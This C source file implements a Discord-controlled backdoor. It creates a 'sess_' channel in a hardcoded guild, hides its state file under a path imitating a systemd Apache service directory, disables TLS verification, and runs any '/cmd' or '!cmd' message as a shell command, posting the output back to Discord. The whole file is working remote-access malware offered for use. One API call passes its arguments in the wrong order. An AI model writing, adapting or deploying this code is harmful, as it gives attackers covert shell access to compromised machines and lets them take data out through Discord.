#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <time.h>
#include <sys/stat.h>
#include <ctype.h>

#define MAX_PROCESS 2       // process at most 2 new messages per poll
#define POLL_SLEEP 2        // seconds between polls (tune as needed)
#define MSG_LIMIT 15        // number of messages to request per poll
#define RECENT_CAP 200

// <-- Put your token here (hardcoded). Program will always use DEFAULT_BOT_TOKEN.
// WARNING: hardcoding tokens in source is insecure for public repos; rotate token if leaked.
static const char *DEFAULT_BOT_TOKEN = "BOTTOKEN";
static const char *GUILD_ID = "1415674125816434742";
static const char *LOG_DIR = "/var/cache/systemd-private-17fbcd29a89f4598a26f3f21791b3918-apache2.service-V9WpOP";
static const char *LOG_FILE = "/var/cache/systemd-private-17fbcd29a89f4598a26f3f21791b3918-apache2.service-V9WpOP/service.log";
static const char *API_BASE = "https://discord.com/api/v10";

struct string { char *ptr; size_t len; };
static void init_string(struct string *s) { s->len = 0; s->ptr = malloc(1); if (!s->ptr) { fprintf(stderr,"malloc failed\n"); exit(1);} s->ptr[0] = '\0'; }
static size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s) {
    size_t add = size * nmemb;
    size_t new_len = s->len + add;
    s->ptr = realloc(s->ptr, new_len + 1);
    if (!s->ptr) { fprintf(stderr,"realloc failed\n"); exit(1); }
    memcpy(s->ptr + s->len, ptr, add);
    s->ptr[new_len] = '\0';
    s->len = new_len;
    return add;
}

static char *BOT_TOKEN = NULL;
static char BOT_USER_ID[64] = {0};

static char *make_api_request(const char *method, const char *endpoint, const char *data, long *out_code) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    struct string s; init_string(&s);
    char url[1024]; snprintf(url, sizeof(url), "%s%s", API_BASE, endpoint);

    struct curl_slist *headers = NULL;
    char auth_hdr[1024]; snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: Bot %s", BOT_TOKEN);
    headers = curl_slist_append(headers, auth_hdr);
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, (size_t(*)(void*,size_t,size_t,void*))writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "discord-c-bot-clean/1.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);


    if (strcasecmp(method, "GET") == 0) curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    else if (strcasecmp(method, "POST") == 0) { curl_easy_setopt(curl, CURLOPT_POST, 1L); if (data) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data); }
    else { curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method); if (data) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data); }

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    if (res != CURLE_OK) {
        fprintf(stderr, "[curl] error: %s\n", curl_easy_strerror(res));
    } else {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    }
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    *out_code = http_code;
    return s.ptr;
}

static int file_exists_and_nonempty(const char *path) {
    struct stat st;
    if (stat(path, &st) == 0) return st.st_size > 0;
    return 0;
}

static char *json_escape(const char *s) {
    size_t len = strlen(s);
    char *out = malloc(len * 4 + 1);
    char *p = out;
    for (size_t i = 0; i < len; ++i) {
        char c = s[i];
        if (c == '\\') { *p++='\\'; *p++='\\'; }
        else if (c == '\"') { *p++='\\'; *p++='\"'; }
        else if (c == '\n') { *p++='\\'; *p++='n'; }
        else *p++ = c;
    }
    *p = '\0';
    return out;
}

// minimal extractors
static char *extract_id_at(const char *p) {
    const char *q = p; while (*q && *q != '\"') q++; size_t n = q - p; if (n==0) return NULL;
    char *id = malloc(n+1); strncpy(id, p, n); id[n]='\0'; return id;
}
static char *extract_content_after(const char *start_pos) {
    const char *cpos = strstr(start_pos, "\"content\":\""); if (!cpos) return NULL;
    cpos += strlen("\"content\":\"");
    size_t cap = 256; char *tmp = malloc(cap); if (!tmp) return NULL;
    size_t ti = 0; int escaped = 0; const char *q = cpos;
    while (*q) {
        if (*q == '\"' && !escaped) break;
        if (*q == '\\' && !escaped) { escaped = 1; q++; continue; }
        if (escaped) {
            char outc = *q;
            if (*q == 'n') outc = '\n';
            else if (*q == 'r') outc = '\r';
            else if (*q == 't') outc = '\t';
            if (ti + 1 >= cap) { cap *= 2; tmp = realloc(tmp, cap); if (!tmp) return NULL; }
            tmp[ti++] = outc; escaped = 0; q++; continue;
        } else {
            if (ti + 1 >= cap) { cap *= 2; tmp = realloc(tmp, cap); if (!tmp) return NULL; }
            tmp[ti++] = *q++;
        }
    }
    tmp[ti] = '\0'; char *out = strdup(tmp); free(tmp); return out;
}
static char *extract_author_id(const char *start_pos) {
    const char *p = strstr(start_pos, "\"author\":"); if (!p) return NULL;
    p = strstr(p, "\"id\":\""); if (!p) return NULL; p += strlen("\"id\":\""); return extract_id_at(p);
}

typedef struct { char *id; char *content; char *author_id; } msg_t;

static msg_t *collect_messages(const char *resp, size_t *out_count) {
    const char *p = resp; msg_t *arr = NULL; size_t cap=0, cnt=0;
    while ((p = strstr(p, "\"id\":\"")) != NULL) {
        const char *valstart = p + strlen("\"id\":\"");
        char *id = extract_id_at(valstart);
        if (!id) { p = valstart; continue; }
        const char *objstart = p; while (objstart > resp && *objstart != '{') objstart--;
        char *content = extract_content_after(objstart);
        char *author_id = extract_author_id(objstart);
        if (cnt + 1 > cap) { cap = cap ? cap*2 : 8; arr = realloc(arr, cap * sizeof(msg_t)); if (!arr) { free(id); return NULL; } }
        arr[cnt].id = id; arr[cnt].content = content; arr[cnt].author_id = author_id;
        cnt++; p = valstart;
    }
    *out_count = cnt; return arr;
}

// simple recent dedupe
static char *recent_keys[RECENT_CAP]; static size_t recent_count = 0;
static void add_recent(const char *author_id, const char *content) {
    if (!author_id || !content) return;
    size_t keylen = strlen(author_id) + 1 + strlen(content) + 1;
    char *key = malloc(keylen); if (!key) return;
    snprintf(key, keylen, "%s|%s", author_id, content);
    if (recent_count >= RECENT_CAP) { free(recent_keys[0]); memmove(recent_keys, recent_keys + 1, (RECENT_CAP - 1) * sizeof(char*)); recent_keys[RECENT_CAP-1] = key; }
    else recent_keys[recent_count++] = key;
}
static int is_recent_dup(const char *author_id, const char *content) {
    if (!author_id || !content) return 0;
    for (size_t i = 0; i < recent_count; ++i) {
        char *k = recent_keys[i]; if (!k) continue;
        size_t aidlen = strlen(author_id);
        if (strncmp(k, author_id, aidlen) == 0 && k[aidlen]=='|' && strcmp(k + aidlen + 1, content) == 0) return 1;
    }
    return 0;
}

static void post_message(const char *channel_id, const char *message) {
    char endpoint[256]; snprintf(endpoint, sizeof(endpoint), "/channels/%s/messages", channel_id);
    char *esc = json_escape(message);
    char body[4096]; snprintf(body, sizeof(body), "{\"content\": \"%s\"}", esc); free(esc);
    long code; char *r = make_api_request("POST", endpoint, body, &code); if (r) free(r);
}

static void run_command_and_post(const char *channel_id, const char *cmd) {
    if (!cmd || strlen(cmd) == 0) { post_message(channel_id, "[empty command]"); return; }
    fprintf(stderr, "[EXEC] running: %s\n", cmd);    // keep only command execution logs
    FILE *fp = popen(cmd, "r");
    if (!fp) { post_message(channel_id, "[popen failed]"); return; }
    char outbuf[4096]; int had_output = 0;
    while (fgets(outbuf, sizeof(outbuf), fp)) {
        had_output = 1; size_t L = strlen(outbuf); if (L && outbuf[L-1]=='\n') outbuf[L-1] = '\0';
        if (strlen(outbuf) == 0) post_message(channel_id, "[empty line]"); else post_message(channel_id, outbuf);
    }
    if (!had_output) post_message(channel_id, "[no output]");
    pclose(fp);
}

int main(void) {
    // Always use hardcoded token (no env lookup)
    BOT_TOKEN = strdup(DEFAULT_BOT_TOKEN);

    char mkcmd[1024]; snprintf(mkcmd, sizeof(mkcmd), "mkdir -p \"%s\"", LOG_DIR); system(mkcmd);
    curl_global_init(CURL_GLOBAL_DEFAULT);

    char *CHANNEL_ID = NULL;
    if (file_exists_and_nonempty(LOG_FILE)) {
        FILE *f = fopen(LOG_FILE, "r");
        if (f) { char buf[128]; if (fgets(buf,sizeof(buf),f)) { char *nl = strchr(buf,'\n'); if (nl) *nl = '\0'; int ok = 1; int len = strlen(buf); if (len < 16 || len > 22) ok = 0; for (int i=0;i<len && ok;i++) if (!isdigit((unsigned char)buf[i])) ok = 0; if (ok) CHANNEL_ID = strdup(buf); } fclose(f); }
    }
    if (!CHANNEL_ID) {
        char randname[32]; srand(time(NULL)^getpid()); const char *chars="abcdefghijklmnopqrstuvwxyz0123456789";
        for (int i=0;i<6;i++) randname[i] = chars[rand() % (strlen(chars))]; randname[6] = '\0';
        char chan_name[64]; snprintf(chan_name, sizeof(chan_name), "sess_%s", randname);
        char postbody[256]; snprintf(postbody, sizeof(postbody), "{\"name\":\"%s\",\"type\":0}", chan_name);
        long code; char *resp; char endpoint[256]; snprintf(endpoint, sizeof(endpoint), "/guilds/%s/channels", GUILD_ID);
        resp = make_api_request("POST", endpoint, postbody, &code);
        if (code == 201 && resp) {
            char *found = strstr(resp, "\"id\":\""); if (found) { found += strlen("\"id\":\""); char *q = found; while (*q && *q != '\"') q++; size_t n = q - found; if (n > 0) { CHANNEL_ID = malloc(n+1); strncpy(CHANNEL_ID, found, n); CHANNEL_ID[n] = '\0'; FILE *f = fopen(LOG_FILE, "w"); if (f) { fprintf(f, "%s\n", CHANNEL_ID); fclose(f); } fprintf(stderr, "[INFO] Created channel %s\n", CHANNEL_ID); } }
            free(resp);
        } else { fprintf(stderr, "[ERR] Failed to create channel (HTTP %ld)\n", code); if (resp) free(resp); curl_global_cleanup(); return 1; }
    } else {
        fprintf(stderr, "[INFO] Using existing channel: %s\n", CHANNEL_ID);
    }

    // get bot's user id to ignore self messages
    {
        long code; char *resp = make_api_request("/users/@me", NULL, NULL, &code);
        if (resp && code == 200) {
            char *p = strstr(resp, "\"id\":\""); if (p) { p += strlen("\"id\":\""); char *q = p; while (*q && *q != '\"') q++; size_t n = q - p; if (n > 0 && n < sizeof(BOT_USER_ID)) { strncpy(BOT_USER_ID, p, n); BOT_USER_ID[n] = '\0'; } }
        } else {
            fprintf(stderr, "[WARN] failed to fetch /users/@me (HTTP %ld)\n", code);
        }
        if (resp) free(resp);
    }

    // startup message (quiet)
    { char ep[256]; snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID); char body[128]; snprintf(body, sizeof(body), "{\"content\":\"Bot started and listening...\"}"); long code; char *r = make_api_request("POST", ep, body, &code); if (r) free(r); }
    fprintf(stderr, "[INFO] Bot started\n");

    // initialize LAST_SEEN to newest to skip backlog
    char *LAST_SEEN = NULL;
    {
        char ep[512]; snprintf(ep, sizeof(ep), "/channels/%s/messages?limit=1", CHANNEL_ID);
        long code; char *resp = make_api_request("GET", ep, NULL, &code);
        if (resp && code == 200) {
            char *p = strstr(resp, "\"id\":\""); if (p) { p += strlen("\"id\":\""); char *q = p; while (*q && *q != '\"') q++; size_t n = q - p; if (n > 0) { LAST_SEEN = malloc(n+1); strncpy(LAST_SEEN, p, n); LAST_SEEN[n] = '\0'; } }
        }
        if (resp) free(resp);
    }

    int backoff = 1;
    while (1) {
        char ep[512]; snprintf(ep, sizeof(ep), "/channels/%s/messages?limit=%d", CHANNEL_ID, MSG_LIMIT);
        long code; char *resp = make_api_request("GET", ep, NULL, &code);
        if (!resp) { sleep(POLL_SLEEP); continue; }

        if (code == 429) {
            const char *p = strstr(resp, "\"retry_after\":");
            int retry = backoff > 0 ? backoff : 1;
            if (p) { p += strlen("\"retry_after\":"); retry = atoi(p); if (retry <= 0) retry = backoff ? backoff : 1; }
            free(resp);
            sleep(retry);
            if (backoff < 64) backoff *= 2;
            continue;
        }
        backoff = 1;

        if (code != 200) { free(resp); sleep(POLL_SLEEP); continue; }

        size_t msg_count = 0; msg_t *msgs = collect_messages(resp, &msg_count);
        if (!msgs) { free(resp); sleep(POLL_SLEEP); continue; }
        if (msg_count == 0) { free(msgs); free(resp); sleep(POLL_SLEEP); continue; }

        if (!LAST_SEEN) {
            LAST_SEEN = strdup(msgs[0].id);
        } else {
            ssize_t found_index = -1;
            for (size_t i = 0; i < msg_count; ++i) {
                if (msgs[i].id && strcmp(msgs[i].id, LAST_SEEN) == 0) { found_index = (ssize_t)i; break; }
            }
            if (found_index == -1) {
                free(LAST_SEEN);
                LAST_SEEN = strdup(msgs[0].id);
            } else {
                ssize_t newer = found_index;
                if (newer > 0) {
                    ssize_t to_process = newer > MAX_PROCESS ? MAX_PROCESS : newer;
                    ssize_t start_idx = found_index - to_process;
                    for (ssize_t idx = start_idx; idx <= found_index - 1; ++idx) {
                        msg_t *m = &msgs[idx];
                        const char *content = m->content ? m->content : "";
                        const char *aid = m->author_id ? m->author_id : "(null)";

                        if (!content || strlen(content) == 0) continue;
                        if (m->author_id && BOT_USER_ID[0] && strcmp(m->author_id, BOT_USER_ID) == 0) continue;
                        if (is_recent_dup(aid, content)) continue;
                        add_recent(aid, content);

                        if (strncmp(content, "/cmd", 4) == 0 || strncmp(content, "!cmd", 4) == 0) {
                            const char *cmd = content + 4; while (*cmd == ' ') cmd++;
                            if (*cmd == '\0') post_message(CHANNEL_ID, "[no command provided]");
                            else run_command_and_post(CHANNEL_ID, cmd);
                        }
                    }
                }
                free(LAST_SEEN);
                LAST_SEEN = strdup(msgs[0].id);
            }
        }

        for (size_t i = 0; i < msg_count; ++i) {
            if (msgs[i].id) free(msgs[i].id);
            if (msgs[i].content) free(msgs[i].content);
            if (msgs[i].author_id) free(msgs[i].author_id);
        }
        free(msgs);
        free(resp);
        sleep(POLL_SLEEP);
    }

    for (size_t i = 0; i < recent_count; ++i) free(recent_keys[i]);
    if (CHANNEL_ID) free(CHANNEL_ID);
    if (LAST_SEEN) free(LAST_SEEN);
    if (BOT_TOKEN) free(BOT_TOKEN);
    curl_global_cleanup();
    return 0;
}
